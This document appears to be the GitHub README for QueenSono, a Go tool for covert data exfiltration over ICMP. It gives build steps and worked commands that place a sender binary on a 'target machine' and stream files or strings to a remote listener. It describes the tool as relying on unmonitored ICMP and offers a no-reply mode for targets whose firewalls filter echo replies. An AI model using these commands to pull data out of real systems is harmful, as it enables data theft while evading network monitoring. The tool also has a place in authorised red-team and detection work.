

  <h1 align="center">QueenSono <i> ICMP Data Exfiltration </i></h1>
<h4 align="center"> A Golang Package for Data Exfiltration with ICMP protocol. </h4>
  <p align="center">
  QueenSono tool only relies on the fact that ICMP protocol isn't monitored. It is quite common. It could also been used within a system with basic ICMP inspection (ie. frequency and content length watcher). Try to imitate <a href="https://github.com/ytisf/PyExfil">PyExfil</a> (and others) with the idea that the target machine does not necessary have python installed (so provide a binary could be useful)
    <br />
    <br>
    <strong>
    <a href="https://github.com/ariary/QueenSono/blob/main/README.md#install">Install it</a>
    ·
    <a href="https://github.com/ariary/QueenSono/blob/main/README.md#usage">Use it</a>
    ·
    <a href="https://github.com/ariary/QueenSono/blob/main/README.md#notes">Notes</a>
    ·
    <a href="https://github.com/ariary/QueenSono/issues">Request Feature</a>
  </strong>
  </p>
</p>

## Install
 *\> Install the binary from source*
 
Clone the repo and download the dependencies locally:
```    
git clone https://github.com/ariary/QueenSono.git
make before.build
```

 To build the ICMP packet sender `qssender` :

     build.queensono-sender
    

 To build the ICMP packet receiver `qsreceiver` :

     build.queensono-receiver

## Usage

`qssender` is the binary which will send ICMP packet  to the listener , so it is the binary you have to transfer on your target machine. 

`qsreceiver` is the listener on your local machine (or wherever you could receive icmp packet)

All commands and flags of the binaries could be found using `--help`

### Example 1: Send with "ACK"
*\> In this example we want to send a big file and look after echo reply to ackowledge the reception of the packets (ACK).*

![demo](https://github.com/ariary/AravisFS/blob/main/img/adretctldemo.gif)

On local machine:

    $ qsreceiver receive -l 0.0.0.0 -p -f received_bible.txt

<details>
  <summary><b>Explanation</b></summary>
    <li>
    <code>-l 0.0.0.0</code>listen on all interfaces for ICMP packet
    </li>
    <li>
      <code>-f received_bible.txt</code> save received data in a file
    </li>
    <li><code>-p</code> show a progress bar of received data </li>

</details>


On target machine:

    $ wget https://raw.githubusercontent.com/mxw/grmr/master/src/finaltests/bible.txt #download a huge file (for the example)
    $ qssender send file -d 2 -l 127.0.0.1 -r 10.0.0.92 -s 50000 bible.txt

<details>
  <summary><b>Explanation</b></summary>
    <li>
    <code>send file</code> for sending file (<code>bible.txt</code> is the file in question)
    </li>
    <li>
      <code>-d 2</code> send a packet each 2 seconds
    </li>
    <li><code>-l 127.0.0.1</code> the listening address for <i>echo reply</i> </li>
    <li><code>-r 10.0.0.92</code> the address of my remote machine with <code>qsreceiver</code> listening</li>
    <li><code>-s 50000</code> the data size I want to send in each packet</li>
</details>


### Example 2: Send without "ACK"
*\> In this example we want to send a message without waiting for echo reply (it could be useful in the case if target firewall filter incoming icmp packet)*

![demo](https://github.com/ariary/AravisFS/blob/main/img/adretctldemo.gif)


On local machine:

    $ qsreceiver receive truncated 1 -l 0.0.0.0
 

<details>
  <summary> <b>Explanation</b></summary>
    <li><code>receive truncated 1</code> does not wait indefinitely if we don't received all the packets. (<code>1</code> is the delay used with <code>qssender</code>)</li>
</details>


On target machine:

    $ qssender send "thisisatest i want to send a string w/o waiting for the echo reply" -d 1 -l 127.0.0.1 -r 10.0.0.190 go.mod -s 1 -N
<details>
  <summary>Explanation</summary>
    <li>
    <code>-N</code> noreply option (don't wait for <i>echo reply</i>)
    </li>
</details>

### Notes
- only work on Linux  (due to the use of golang net icmp package)
- need `cap_net_raw capabilities`
